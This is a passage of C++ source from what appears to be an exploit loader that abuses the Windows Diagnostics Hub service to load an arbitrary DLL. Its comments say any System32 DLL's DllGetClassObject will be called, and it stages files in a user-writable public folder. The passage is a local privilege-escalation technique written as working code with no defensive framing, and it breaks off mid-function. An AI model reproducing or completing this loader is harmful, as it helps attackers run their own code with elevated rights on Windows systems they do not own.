// DiaghubLoader.cpp : Defines the exported functions for the DLL.
...
extern "C"
{
	// target_dll can be any DLL \Windows\System32\ . Diaghub will call the exported function "DllGetClassObject"
	// target_dll should be the filename only
	void LoadDll(void)
	{
		wchar_t target_dll[1024];
		GetTargetFilenameW(target_dll);
		wchar_t* valid_dir = (wchar_t*)L"C:\\Users\\Public\\"; // Can be any valid path that the current user can write to
